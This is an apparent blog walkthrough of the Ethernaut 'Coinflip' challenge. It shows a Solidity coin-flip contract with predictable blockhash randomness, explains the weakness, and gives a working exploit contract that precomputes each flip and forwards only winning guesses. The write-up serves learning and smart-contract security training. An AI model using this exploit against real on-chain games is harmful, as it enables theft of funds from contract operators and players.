---
title: Ethernaut 0x3 - Coinflip Walkthrough
date: 2021-04-19 10:54:43.423 +0800
categories:
  - "Write Up"
---

### Overview

This is a coin flipping game where you need to build up your winning streak by guessing the outcome of a coin flip. To complete this level you'll need to use your psychic abilities to guess the correct outcome 10 times in a row.

`Coinflip.sol`

```solidity
pragma solidity ^0.6.0;

import "https://github.com/OpenZeppelin/openzeppelin-contracts/blob/cec0800c541c809f883a37f2dfb91ec4c90263c5/contracts/math/SafeMath.sol";

contract CoinFlip {

  using SafeMath for uint256;
  uint256 public consecutiveWins;
  uint256 lastHash;
  uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

  constructor() public {
    consecutiveWins = 0;
  }

  function flip(bool _guess) public returns (bool) {
    uint256 blockValue = uint256(blockhash(block.number.sub(1)));

    if (lastHash == blockValue) {
      revert();
    }

    lastHash = blockValue;
    uint256 coinFlip = blockValue.div(FACTOR);
    bool side = coinFlip == 1 ? true : false;

    if (side == _guess) {
      consecutiveWins++;
      return true;
    } else {
      consecutiveWins = 0;
      return false;
    }
  }
```

### Randomness in Solidity

Generating random numbers in solidity can be tricky. There currently isn't a native way to generate them, and everything you use in smart contracts is publicly visible, including the local variables and state variables marked as private. Miners also have control over things like blockhashes, timestamps, and whether to include certain transactions - which allows them to bias these values in their favor.

To get cryptographically proven random numbers, you can use [Chainlink VRF](https://docs.chain.link/docs/get-a-random-number), which uses an oracle, the LINK token, and an on-chain contract to verify that the number is truly random.

### Solution

Head over to [Remix IDE](https://remix.ethereum.org/) and deploy a cloned version of `Coinflip.sol`

The new contract will contain a function which will pre-compute the pseudo randomness of each flips for us. Only the "correct" guesses will be sent to the main contract.

`CoinflipHack.sol`

```solidity
pragma solidity ^0.6.0;

import './Coinflip.sol'

contract CoinflipHack {
    address private instance = 0xC738b5c78719Bbb60C7095acdA04D9C9084316b0;
    CoinFlip public originalContract = CoinFlip(instance);
    
    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
    
    function hackFlip(bool _guess) public {
        
        uint256 blockValue = uint256(blockhash(block.number-1));
        uint256 coinFlip = blockValue / FACTOR;
        bool side = coinFlip == 1 ? true : false;

        if (side == _guess) {
          originalContract.flip(_guess);
        } else {
          originalContract.flip(!_guess);
        }
    }
}
```


